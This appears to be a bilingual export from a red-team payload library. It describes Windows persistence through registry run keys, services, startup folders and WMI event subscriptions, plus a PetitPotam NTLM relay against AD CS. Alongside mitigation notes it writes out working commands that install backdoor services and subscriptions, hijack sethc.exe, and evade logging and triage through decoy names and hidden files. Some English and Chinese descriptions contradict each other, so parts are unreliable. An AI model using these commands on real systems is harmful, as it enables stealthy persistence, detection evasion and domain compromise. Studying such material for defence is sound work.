wafBypass.command: wevtutil qe Microsoft-Windows-Sysmon/Operational "/q:*[System[(EventID=1 or EventID=7 or EventID=10)]]" /c:20 /rd:true /f:text

description.zh: 规避 PowerShell 日志依赖：系统原生事件工具查询 Sysmon 关键事件；返回事件文本即成功。受控样例：用于建立基线/对照，非独立绕过手法。语义注记：本条实为 Sysmon/4688 审计对照命令而非检测规避变体，按报告迁出为对照组保留。
description.en: Query key Sysmon events with the native event tool, avoiding PowerShell logging dependencies; returned event text confirms success.Controlled sample: establishes the baseline or contrast group, not an independent bypass technique. Semantic note: this entry is a Sysmon/4688 audit contrast command rather than an evasion variant, retained as the contrast group per the review.

description.zh: 以进程创建审计事件对照 Sysmon 遥测缺口；返回 4688 事件即具备对照基线。受控样例：用于建立基线/对照，非独立绕过手法。语义注记：本条实为 Sysmon/4688 审计对照命令而非检测规避变体，按报告迁出为对照组保留。
description.en: Cross-check telemetry gaps with process-creation audit events; returned 4688 events establish the comparison baseline.Controlled sample: establishes the baseline or contrast group, not an independent bypass technique. Semantic note: this entry is a Sysmon/4688 audit contrast command rather than an evasion variant, retained as the contrast group per the review.

description.zh: 直接导出当前 Sysmon 配置核对镂空相关规则覆盖；输出含对应事件 ID 即规则生效。受控样例：用于建立基线/对照，非独立绕过手法。语义注记：本条实为 Sysmon/4688 审计对照命令而非检测规避变体，按报告迁出为对照组保留。
description.en: Dump the live Sysmon config to verify hollowing-relevant rule coverage; the relevant event IDs present confirm active rules.Controlled sample: establishes the baseline or contrast group, not an independent bypass technique. Semantic note: this entry is a Sysmon/4688 audit contrast command rather than an evasion variant, retained as the contrast group per the review.

title.zh: Sysmon 进程创建与镜像加载事件审计
title.en: Audit Sysmon process creation and image loading

description.zh: 抽取 Sysmon 进程创建（Id=1）、镜像加载（Id=7）与进程访问（Id=10）事件，核对 SVCHOST 实例的父进程、命令行与加载模块是否与已知宿主一致。
description.en: Extract Sysmon process creation, image loaded, and process access events and verify each SVCHOST instance parent, command line, and loaded modules against known baselines.

title.zh: SVCHOST 实例路径与模块完整性核查
title.en: Verify SVCHOST instance path and module integrity

execution.command: Get-Process svchost -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path, @{n='ModuleSample';e={(@($_.Modules | Select-Object -First 5).ModuleName) -join ','}}

description.zh: 枚举运行中的 SVCHOST 实例，检查可执行路径与已加载模块列表；镂空后的进程通常出现路径为空或模块列表异常，可据此定位被替换宿主。
description.en: Enumerate running SVCHOST instances and inspect executable paths and loaded modules; hollowed processes often show empty paths or abnormal module lists.

title.zh: 镂空可疑父与镜像加载关联复核

description.zh: 对命中可疑特征的实例回查其进程创建与镜像加载事件，形成镂空行为的时间线证据并关联同一请求标识。
description.en: Correlate suspicious instances back to their creation and image-load events to build a timeline of hollowing behavior under the same request identifier.

name.zh: 注册表启动项持久化审计

description.zh: 审计 Run/RunOnce 等自启动键的新增与异常项，验证注册表启动项持久化痕迹。
description.en: Adds and then audits Run/RunOnce autorun values to show that registry startup keys are writable by privileged processes, lack an integrity baseline, and survive logon invisibly when routine checks miss them.

overview.zh: 该 Payload 覆盖注册表启动项持久化的植入与审计场景，检验 Run、RunOnce、Winlogon 与服务键的自启行为及检测面。验证维度含四类注册表持久化机制的写入与回读对照，对应第 1 至第 4 步。
overview.en: This payload covers registry run-key persistence implantation and auditing, testing autostart behavior and detection surface across Run, RunOnce, Winlogon and service keys. Validation writes and reads back four registry persistence mechanisms, mapped to steps 1 through 4.

vulnerability.zh: 根因在于自启注册表键对高权限进程可写且默认无完整性基线校验：恶意值混入 Run 或 Userinit 后随登录执行，常规巡检如未覆盖这些键即长期驻留。
vulnerability.en: The root cause is autostart registry keys writable by high-privilege processes with no integrity baseline by default: once malicious values slip into Run or Userinit they execute at logon and persist whenever routine checks miss those keys.

exploitation.zh: 第 1 步写入 HKLM Run 键并回读，重启后命令执行即确认自启；第 2 步写入 RunOnce 验证一次性触发后键被删除；第 3 步向 Userinit 追加路径，登录时随 userinit 执行即确认劫持；第 4 步用 sc create 建自启服务并以 qc 核对。以回读值与执行痕迹为判据。占位符在全局变量菜单替换；测试后立即清除。
exploitation.en: In step 1, write the HKLM Run key and read it back; execution after reboot confirms autostart. In step 2, write RunOnce verifying one-shot triggering and key deletion. In step 3, append to Userinit; execution alongside userinit at logon confirms the hijack. In step 4, create an autostart service with sc create checked via qc. Judge by read-back values and execution traces. Replace placeholders via the global variables menu; clean up immediately after testing.

mitigation.zh:
自启键建配置基线并以 Sysmon 12/13 监控，限制非授权进程写入 HKLM 运行键：
    $key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $acl = Get-Acl $key
    $acl.AddAccessRule((New-Object System.Security.AccessControl.RegistryAccessRule("Users", "WriteKey", "Deny")))
    Set-Acl $key $acl
    <RegistryEvent onmatch="include">
      <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
    </RegistryEvent>
    修复后重放第 1 至第 4 步，全部写入应触发告警并可在基线比对中定位。
mitigation.en: Baseline autostart keys and alert on modification events (Sysmon 12 and 13), blocking unauthorized processes from writing HKLM run keys. After the fix, replay steps 1 through 4: every write should trigger real-time alerts and stand out in baseline diffs.

title.zh: 写入 Run 键开机自启

description.zh: 用 reg add 向 HKLM 的 Run 键写入后门程序路径；回读键值成功且重启后命令执行即建立最直接的开机持久化通道。
description.en: Write the backdoor path into HKLM's Run key with reg add; a successful readback plus execution after reboot establishes boot persistence.

title.zh: 借 RunOnce 实现单次触发

description.zh: 向 RunOnce 键写入载荷路径；下次登录执行一次后键值自动删除，比 Run 键留下更短的取证痕迹，适合一次性载荷落地。
description.en: Write the payload into RunOnce; it fires on next logon and the value self-deletes, leaving a shorter forensic trail for one-shot payloads.

description.zh: 在 Userinit 值末尾追加后门路径；用户登录时随 userinit 一并启动，回读包含追加项即确认登录链持久化生效且不易被察觉。
description.en: Append the backdoor path to the Userinit value; it launches alongside userinit at every logon, a stealthier persistence hook that survives reboots.

description.zh: 用 sc create 注册 AUTO_START 服务指向后门程序；qc 回读显示自动启动且开机执行即获得比注册表更稳定的系统级持久化通道。
description.en: Create an AUTO_START service with sc create pointing at the backdoor; auto-start confirmed by sc qc yields a steadier system-level persistence than registry keys.

attackChain.payload: sc create Backdoor binPath= "C:\backdoor.exe" start= auto

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 注册表启动项持久化审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Registry Startup Persistence Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: 注册表启动项持久化审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Registry Startup Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 持久化验证结束立即删除测试键值并记录删除时间，防止残留项在真实登录时触发；审计基线与删除清单归档备查。
opsecTips.en: Delete test values immediately after verification and log the removal time so no residual autorun fires on a real logon; archive the audit baseline and removal list.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避 reg.exe 命令行审计：PowerShell 注册表提供程序写 Run 键；键值查询回显即驻留生效。
description.en: Write the Run key via the PowerShell registry provider to avoid reg.exe command-line auditing; the value echoing on query confirms persistence.

description.zh: 以 RunOnce 替代 Run 降低常规自启清单命中率；重启后执行并自清键即成功。
description.en: Use RunOnce instead of Run to fall outside routine autostart inventories; execution after reboot with the key self-clearing confirms success.

wafBypass.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Users\Public\backdoor.exe"

description.zh: 绕过对 Run/RunOnce 键的专门监控：劫持辅助程序调试器键实现触发；连按五次 Shift 拉起程序即成功。
description.en: Hijack an accessibility binary's debugger key to sidestep Run-key-specific monitoring; the program launching via the trigger confirms success.

description.zh: 绕过针对 HKLM 自启动键的集中审计：改写 HKCU\Environment 中的 UserInitMprLogonScript，在用户上下文静默执行；登录后出现对应进程即成功。
description.en: Persist via the HKCU logon-script key outside HKLM domain auditing; the process appearing after logon confirms success.

description.zh: 写入 Run 键实现开机自启；reg query 回读该键值且重启后命令执行，即写入与触发均成功。
description.en: Write the Run key for boot autostart; reg query reading the value back and execution after reboot confirm both the write and the trigger.

description.zh: 写入 RunOnce 键；回读成功且下次登录执行一次后键被删除，即确认一次性持久化行为。
description.en: Write the RunOnce key; a successful read-back with one-shot execution at next logon and key deletion confirms one-shot persistence.

description.zh: 修改 Userinit 追加后门路径；回读值包含追加项且登录时随 userinit 执行，即确认 Winlogon 持久化。
description.en: Append the backdoor path to Userinit; the read-back containing the appendage and execution alongside userinit at logon confirm Winlogon persistence.

execution.command: sc create Backdoor binPath= "C:\backdoor.exe" start= auto

description.zh: 创建自启动服务；sc qc 显示 AUTO_START 且启动时执行 binPath，即确认服务持久化。
description.en: Create the auto-start service; sc qc showing AUTO_START with binPath executing at start confirms service persistence.

name.zh: 服务持久化配置审计

description.zh: 审计服务 binpath 与恢复动作配置，验证服务形态的持久化滥用。
description.en: Registers a service whose binPath points at a script interpreter and configures failure-recovery actions, giving attacker code both boot-start and crash-restart triggers with higher stealth than startup folders.

overview.zh: 该 Payload 覆盖服务持久化配置审计场景，检验自启服务创建与启动触发的完整链路。验证维度含 Base64 载荷服务注册与启动执行两步，对应第 1 至第 2 步。
overview.en: This payload covers service-persistence configuration auditing, testing the full chain of autostart service creation and launch triggering. Validation covers registering a Base64-payload service and start execution, mapped to steps 1 and 2.

vulnerability.zh: 根因在于服务注册默认要求管理员但常被滥用为合法变更：指向脚本解释器的 binPath 获得开机自启与失败重启的双重触发，隐蔽性高于启动目录。
vulnerability.en: The root cause is service registration requiring administrator yet frequently abused as legitimate change: a binPath pointing at script interpreters gains both boot-start and failure-restart triggers, hiding better than startup folders.

exploitation.zh: 第 1 步用 sc create 注册自启服务 evilsvc，binPath 指向 Base64 解码命令，qc 回读确认创建成功；第 2 步以 sc start 触发执行，载荷命令执行即确认持久化链路完整（cmd /c 包装的服务不会维持 RUNNING，以载荷执行痕迹为准）。以执行痕迹与开机自动加载为成功判据。占位符在全局变量菜单替换；测试后 sc delete 清理服务。
exploitation.en: In step 1, register autostart service evilsvc with sc create, pointing binPath at a Base64-decoded command, and confirm creation via qc read-back. In step 2, trigger execution with sc start; RUNNING status plus payload execution confirms the persistence chain. Judge success by execution traces and service state. Replace placeholders via the global variables menu; clean up with sc delete after testing.

mitigation.zh:
服务创建/变更事件（7045/7040）默认记录，重点在实时告警与基线比对，并约束管理员执行来源：
    Get-WinEvent -FilterHashtable @{LogName='System';Id=7045,7040} -MaxEvents 50 | Select TimeCreated, Message
    Get-Service | Select Name, Status, StartType | Export-Csv C:\baseline\services.csv -NoTypeInformation
mitigation.en: Enable event auditing for service creation and changes (7045, 7040), diff service inventories against baselines, and constrain administrator execution sources. After the fix, replay step 1: registration should alert instantly and enter approval workflow.

description.zh: 把要常驻执行的命令编码为 Base64 形态并验证可独立运行；确定为服务 binPath 的最终载荷，避免命令行特殊字符引发解析问题。
description.en: Base64-encode the resident command and verify it executes standalone; fixing the final binPath payload early avoids parsing surprises in service control.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

description.zh: 用 sc create 注册 auto 启动类型的服务，binPath 指向 Base64 编码命令；服务创建成功即写入系统级自启配置，等待开机加载。
description.en: Register an auto-start service with sc create whose binPath runs a Base64 command; creation writes the system-level autostart entry awaiting boot.

attackChain.payload: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

title.en: Start the service to verify firing

description.zh: 用 sc start 启动服务；载荷命令执行即确认持久化生效（cmd /c 包装的 binPath 不维持 RUNNING，SCM 报终止属预期），系统重启后仍会自动加载执行。
description.en: Start it with sc start; RUNNING status plus the encoded command executing proves persistence that survives reboots.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Service Persistence Configuration Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.en: Service Persistence Configuration Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 服务持久化配置在重启后生效——验证后立即删除测试服务并核对 binPath 还原；不在域控或生产节点验证。
opsecTips.en: Service persistence takes effect after reboot — delete the test service and confirm binPath restoration immediately after verification, and never validate on domain controllers or production nodes.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command: powershell -NoProfile -Command "New-Service -Name 'SysUpdate' -BinaryPathName 'cmd /c powershell -e {LAB_BASE64_COMMAND}' -StartupType Automatic -Description 'Windows system update helper'"

description.zh: 规避 sc.exe 命令行审计并以描述伪装：服务创建成功且自启动即驻留生效。
description.en: Create the service via PowerShell with a decoy description past sc.exe auditing; creation with automatic startup confirms persistence.

title.zh: 现有服务 ImagePath 劫持

description.zh: 不新建对象只改既有服务路径：绕过新增服务审计；服务重启后执行载荷即成功。
description.en: Modify an existing service's ImagePath instead of creating one, evading new-object auditing; the payload running on service restart confirms success.

wafBypass.command: sc create "WindowsRemoteManagementUpdater" binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto DisplayName= "Windows Remote Management Updater"

description.zh: 系统风格长名与显示名降低运维目视告警；服务列表出现且 start= auto 即成功。
description.en: A system-style long name lowers visual triage alerts; the service listed with automatic start confirms success.

execution.command: sc create evilsvc binPath= "cmd /c powershell -e {LAB_BASE64_COMMAND}" start= auto

description.zh: 用 sc create 注册开机自启的 evilsvc 服务，其 binPath 以 Base64 解码命令启动 PowerShell。
description.en: Registers the evilsvc service with sc create for auto start; its binPath launches PowerShell with the Base64-decoded command.

description.zh: 启动服务触发载荷；载荷命令执行即确认服务持久化触发成功。binPath 为 cmd /c 包装时进程随即退出，SCM 报错或显示停止属预期，不影响载荷已执行。
description.en: Start the service to fire the payload; sc query showing RUNNING with the payload command executed confirms the trigger.

name.zh: 启动文件夹持久化审计

description.zh: 审计用户与公共启动文件夹的持久化条目，验证自启动滥用面。
description.en: Drops a shortcut into per-user and ProgramData startup folders and audits the persistence entries, showing that the common ProgramData path achieves all-user logon triggering while baseline checks miss it.

overview.zh: 该 Payload 覆盖启动文件夹持久化审计场景，检验用户级与全用户启动目录的植入触发行为。验证维度含当前用户与所有用户两类启动路径的快捷方式放置，对应第 1 至第 2 步。
overview.en: This payload covers startup-folder persistence auditing, testing implantation and triggering across per-user and all-users startup directories. Validation places shortcuts into both startup paths, mapped to steps 1 and 2.

vulnerability.zh: 根因在于启动目录内文件随登录自动执行且常规基线常遗漏 ProgramData 公共路径：放入恶意快捷方式即可获得用户级乃至全用户登录触发。
vulnerability.en: The root cause is startup-folder files auto-executing at logon while baselines often miss the ProgramData common path: a planted shortcut yields user-level or all-user logon triggers.

exploitation.zh: 第 1 步把测试快捷方式复制进当前用户 Startup 目录，登录后自动运行即确认用户级持久化；第 2 步复制进 ProgramData 全用户 Startup 目录，任意账户登录即触发，记录触发账户以验证作用域。以执行痕迹与登录时间关联为成功判据。占位符在全局变量菜单替换；快捷方式仅执行回显命令，测试后删除。
exploitation.en: In step 1, copy a test shortcut into the current user's Startup folder; auto-execution at next logon confirms user-level persistence. In step 2, copy into the ProgramData all-users Startup folder, triggered by any account logon, recording the triggering account to verify scope. Judge success by execution traces correlated with logon times. Replace placeholders via the global variables menu; let the shortcut run an echo command only and delete it after testing.

mitigation.zh:
两个启动目录纳入文件完整性监控，回收普通用户对 ProgramData 公共启动目录的写权限：
    $p = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp'
    icacls $p /inheritance:r /grant 'Administrators:(OI)(CI)F' 'SYSTEM:(OI)(CI)F' 'Everyone:(RX)'
    Get-ChildItem $p, "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" | Get-FileHash
mitigation.en: Bring both startup directories under file-integrity monitoring and revoke standard-user write access to the ProgramData startup path. After the fix, replay steps 1 and 2: placement should alert and no logon executions appear.

description.zh: 制作指向后门程序的 evil.lnk 快捷方式并验证后门可独立执行；可附带正常图标与参数降低使用者怀疑，为落地做好准备。
description.en: Craft evil.lnk pointing at the backdoor and verify it runs standalone; a normal icon and arguments keep the shortcut unsuspicious before planting.

description.zh: 把快捷方式复制到当前用户启动文件夹；目录出现文件且重新登录自动执行即完成用户级持久化，无需管理员权限即可落地。
description.en: Copy the shortcut into the user's Startup folder; the file appearing plus execution on next logon completes per-user persistence without admin rights.

title.zh: 扩展到全用户启动目录
title.en: Extend to the all-users Startup folder

description.zh: 把快捷方式复制到 ProgramData 下的所有用户启动文件夹；任意账户登录即触发执行，覆盖面从单用户扩大到全部使用者。
description.en: Copy the shortcut into ProgramData's all-users Startup; every account logon fires it, widening coverage from one user to all of them.

analysis.en: Startup-Folder Persistence Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 启动项在下次登录真实触发——验证文件落地即删；公共启动目录的测试项使用随机名避免与真实项混淆。
opsecTips.en: Startup entries fire on the next real logon — delete the dropped file once it lands, and give test entries in the common startup folder random names so they cannot be confused with real ones.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 规避对 copy 落文件的监控：COM 对象生成伪装名快捷方式且隐藏窗口；lnk 出现在启动目录即成功。
description.en: Generate a masquerading hidden-window shortcut via COM instead of file copies; the .lnk appearing in Startup confirms success.

description.zh: 以系统风格命名并设置隐藏属性降低目视排查率；文件存在且登录触发即成功。
description.en: Use a system-style name plus hidden attribute to reduce visual triage; the file existing and firing at logon confirms success.

description.zh: 绕过按用户 Profile 路径的监控：落全局启动目录覆盖所有账户；任意用户登录后进程出现即成功。
description.en: Drop into the all-users Startup directory past per-profile monitoring; the process appearing for any user logon confirms success.

description.zh: 复制快捷方式到当前用户启动文件夹；目标目录出现该文件且登录时自动运行，即确认用户级持久化。
description.en: Copy the shortcut into the current-user Startup folder; the file present and auto-running at logon confirms user-level persistence.

description.zh: 复制到所有用户启动文件夹；任意账户登录即触发执行，确认全用户持久化。
description.en: Copy into the all-users Startup folder; execution triggered for any account logon confirms machine-wide persistence.

name.zh: WMI 永久事件订阅审计

description.zh: 枚举 WMI 永久事件订阅（__EventFilter/Consumer/Binding），验证无文件持久化痕迹。
description.en: Enumerates __EventFilter, __EventConsumer, and __FilterToConsumerBinding instances in root subscription, showing that a single binding re-executes attacker commands at SYSTEM level with almost no routine coverage.

overview.zh: 该 Payload 覆盖 WMI 永久事件订阅持久化审计场景，检验过滤器、消费者与绑定三件套的植入与检测面。验证维度含事件过滤器创建、命令行消费者创建与两者绑定三步，对应第 1 至第 3 步。
overview.en: This payload covers WMI permanent-event-subscription persistence auditing, testing implantation and detection across the filter-consumer-binding triad. Validation covers event-filter creation, command-line consumer creation and their binding, mapped to steps 1 through 3.

vulnerability.zh: 根因在于 WMI 永久订阅以系统权限响应事件且常规巡检极少覆盖 root subscription 命名空间：一次绑定即可在触发条件满足时反复执行攻击者命令。
vulnerability.en: The root cause is permanent subscriptions responding with system privileges while routine checks rarely cover the root subscription namespace: one binding re-executes attacker commands whenever the trigger condition fires.

exploitation.zh: 第 1 步以 Set-WmiInstance 注册名为 evil 的事件过滤器并确认返回实例；第 2 步创建 CommandLineEventConsumer 指向 Base64 解码命令；第 3 步建立 FilterToConsumerBinding 完成绑定，触发对应事件后载荷执行即确认持久化生效。以绑定实例与执行痕迹为成功判据。占位符在全局变量菜单替换；测试后立即删除三件套对象。
exploitation.en: In step 1, register an event filter named evil with Set-WmiInstance and confirm the returned instance. In step 2, create a CommandLineEventConsumer pointing at a Base64-decoded command. In step 3, establish the FilterToConsumerBinding; payload execution on the trigger event confirms persistence. Judge success by the binding instance and execution traces. Replace placeholders via the global variables menu; delete all three objects immediately after testing.

mitigation.zh:
Sysmon 开启 WMI 事件（19-21）集中告警，基线比对 root\subscription 订阅对象，限制远程 WMI 管理：
    sysmon64 -accepteula -i C:\sysmon\config.xml
    <EventFiltering>
      <WMIEvent onmatch="exclude"/>
    </EventFiltering>
    Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
    Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
mitigation.en: Monitor creation events in the root subscription namespace (Sysmon 19 through 21), diff subscription objects against baselines, and restrict remote WMI management. After the fix, replay steps 1 through 3: every step should raise real-time alerts.

description.zh: 用 Set-WmiInstance 创建 __EventFilter，以 WQL 监听定时或实例修改事件；返回过滤器实例即埋下持久化的触发条件，周期可自行设定。
description.en: Create an __EventFilter with Set-WmiInstance listening on a WQL timer or modification event; the returned instance plants the persistence trigger.

attackChain.payload: $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="evil"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

description.zh: 创建 CommandLineEventConsumer 并指向 Base64 编码的 PowerShell 命令；消费者落成即定义事件触发后执行的动作载荷。
description.en: Create a CommandLineEventConsumer pointing at a Base64-encoded PowerShell command; the consumer defines the action fired when the filter trips.

description.zh: 用 __FilterToConsumerBinding 把前两步的组件绑定；查询到绑定实例即事件订阅持久化生效，系统重启后仍然存活。
description.en: Bind the two components with __FilterToConsumerBinding; once the binding is queryable, the subscription persists across reboots.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 WMI 永久事件订阅审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for WMI Permanent Event-Subscription Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: WMI 永久事件订阅审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: WMI Permanent Event-Subscription Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 永久订阅会随事件反复触发——验证一次命中后立即删除 Filter/Consumer/Binding 三元组并核对删除完整。
opsecTips.en: Permanent subscriptions re-fire on every matching event — delete the filter, consumer, and binding triple immediately after one successful hit and verify the removal is complete.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

wafBypass.command:
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="WindowsUpdate",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer CREATE Name="WindowsUpdate",CommandLineTemplate="cmd /c C:\Users\Public\backdoor.exe"
wmic /namespace:\\root\subscription PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='WindowsUpdate'",Consumer="CommandLineEventConsumer.Name='WindowsUpdate'"

description.zh: 规避 PowerShell Set-WmiInstance 脚本块日志：原生 wmic 三段式建订阅；绑定创建成功即驻留就绪。
description.en: Build the subscription with native wmic three-parter to avoid PowerShell script-block logs; the binding creation completes the persistence.

description.zh: 把事件订阅写进托管对象格式由编译器装载：绕过对 Set-WmiInstance 调用的检测；返回 success 且事件触发即成功。
description.en: Compile a Managed Object Format file to load the subscription, bypassing Set-WmiInstance detection; success plus event triggering confirms it.

title.zh: WMI 类实例 PowerShell 变体

wafBypass.command: powershell -NoProfile -Command "$f=([wmiclass]'root\subscription:__EventFilter').CreateInstance();$f.Name='WindowsUpdate';$f.QueryLanguage='WQL';$f.Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'\";$f.Put()"

description.zh: 以 [wmiclass] 原生类型替代 Set-WmiInstance cmdlet 特征；对象路径返回即订阅写入。
description.en: Create the filter via the native [wmiclass] type instead of the Set-WmiInstance cmdlet; a returned object path confirms the subscription write.

execution.command: $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="evil"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

description.zh: 注册 WMI 事件过滤器；返回 __EventFilter 实例即创建成功。
description.en: Register the WMI event filter; a returned __EventFilter instance confirms creation.

title.zh: 创建命令行事件消费者

description.zh: 以 Set-WmiInstance 注册 CommandLineEventConsumer，使事件触发时以 Base64 解码命令启动 PowerShell。
description.en: Registers a CommandLineEventConsumer via Set-WmiInstance so the triggered event launches PowerShell with the Base64-decoded command.

title.en: Bind the filter to the consumer

description.zh: 绑定过滤器与消费者；查询到对应 __FilterToConsumerBinding 即持久化生效。
description.en: Bind the filter to the consumer; the corresponding __FilterToConsumerBinding found via query confirms active persistence.

name.zh: PetitPotam/EFSRPC 暴露审计

description.zh: 验证 PetitPotam/EFSRPC 强制认证路径可用性与补丁状态，评估中继前提。
description.en: Triggers LSARPC/EFSRPC on the target to coerce an NTLM authentication to the operator host, then relays it to AD CS Web Enrollment without EPA to obtain a domain-controller certificate.

subCategory.zh: 域控漏洞与已知利用链

overview.zh: PetitPotam/EFSRPC 暴露审计覆盖 EFSRPC 强制认证场景：针对未修补 EFSRPC 或 AD CS 未启用 EPA 的域环境，验证能否强制域控发起认证并中继获取机器证书。验证维度涵盖 ADCS 中继监听、PetitPotam 触发回调与 SMB 签名基线核对三类步骤。
overview.en: PetitPotam and EFSRPC Exposure Audit covers EFSRPC coercion: for domains with unpatched EFSRPC or ADCS endpoints lacking EPA, verify whether the DC can be forced to authenticate and relayed for machine certificates. Verification dimensions cover ADCS relay listening, PetitPotam callback triggering, and SMB signing baseline checks.

vulnerability.zh: 根因是 LSARPC/EFSRPC 接口可在未认证情况下触发目标机器向攻击者发起 NTLM 认证；AD CS Web 端点未要求 EPA 时，中继该认证即可为域控申请证书，随后以 Domain Controller 身份执行 DCSync 导出全量哈希。
vulnerability.en: The root cause is LSARPC/EFSRPC interfaces that make the target machine initiate NTLM authentication to the attacker without requiring authentication; while ADCS web endpoints do not require EPA, relaying that authentication enrolls a DC certificate, after which DCSync runs as the Domain Controller to export all hashes.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步启动 ntlmrelayx 指向 AD CS Web 注册端点（http://{CA_HOST}/certsrv，启用 --adcs）监听中继；第 2 步运行 petitpotam.py 指向操作主机与域控，域控向操作主机发起 NTLM 回调即确认强制认证生效，中继器随之取得 DC 机器证书；第 3 步用 Get-SmbServerConfiguration 核对 SMB 签名配置，RequireSecuritySignature 为 True 表示 SMB 中继受限（LDAP 中继需另行核对 LDAP 签名/通道绑定），作为中继面判定的对照基线。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 starts the relay with ntlmrelayx -t ldap://DC --adcs; step 2 runs petitpotam.py toward the operator host and the DC — an NTLM callback from the DC to the operator confirms coercion, and the relay obtains the DC machine certificate; step 3 reviews signing with Get-SmbServerConfiguration — RequireSecuritySignature True means LDAP relay is constrained, serving as a comparison baseline. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
域控安装 EFSRPC 补丁并禁用匿名调用，AD CS certsrv 端点强制 EPA，域控 LDAP 强制签名：
    Set-WebConfigurationProperty -Location 'Default Web Site/certsrv' -Filter 'system.webServer/security/access' -Name 'sslFlags' -Value 'Ssl,SslNegotiateCert,SslRequireCert'
